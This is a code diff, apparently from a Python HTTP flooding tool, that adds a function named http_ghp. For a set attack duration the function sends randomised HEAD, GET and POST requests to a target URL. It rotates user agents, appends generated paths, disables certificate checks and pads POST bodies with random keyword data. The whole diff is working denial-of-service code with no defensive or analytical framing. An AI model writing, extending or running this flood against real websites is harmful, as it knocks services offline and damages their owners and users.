@@ -135,3 +135,39 @@ def http_head(worker_id, session, target_url, attack_duration, useragent=None, t
         Core.infodict[worker_id]['req_total'] += 1
 
     Core.threadcount -= 1
+
+def http_ghp(worker_id, session, target_url, attack_duration, useragent=None, referer=None, target_port=None):
+    '''
+    GET/HEAD/POST flood
+    '''
+
+    if target_url is None:
+        return False
+
+    time.sleep(5)
+
+    if target_port is None:
+        target_port = '443' if target_url.startswith('https://') else '80'
+
+    stoptime = time.time() + attack_duration
+    while time.time() < stoptime and Core.attackrunning:
+        try:
+
+            method_choice = randint(0,2)
+            if method_choice == 0: session.head(f'{target_url}:{target_port}/{buildblock(target_url)}', headers={'User-Agent': choice(ualist) if useragent is None else useragent}, verify=False, timeout=2, allow_redirects=False, stream=False)
+            elif method_choice == 1: session.get(f'{target_url}:{target_port}/{buildblock(target_url)}', headers=buildheaders(target_url, useragent, referer), verify=False, timeout=(5, 2), allow_redirects=False, stream=False)
+            elif method_choice == 2: # url encoded data flood only
+                url_encoded_data = f'{choice(keywords)}={choice(keywords)}'
+
+                for _ in range(randint(0, 12)):
+                    if randint(0,1) == 1: url_encoded_data += f'&{choice(keywords)}={choice(keywords)}'
+                    else: pass
+
+                session.post(f'{target_url}:{target_port}/{buildblock(target_url)}', headers=buildheaders(target_url, useragent, referer), data=url_encoded_data, verify=False, timeout=2, allow_redirects=False, stream=False)
+
+            Core.infodict[worker_id]['req_sent'] += 1
+        except Exception:
+            Core.infodict[worker_id]['req_fail'] += 1
+        Core.infodict[worker_id]['req_total'] += 1
+
+    Core.threadcount -= 1
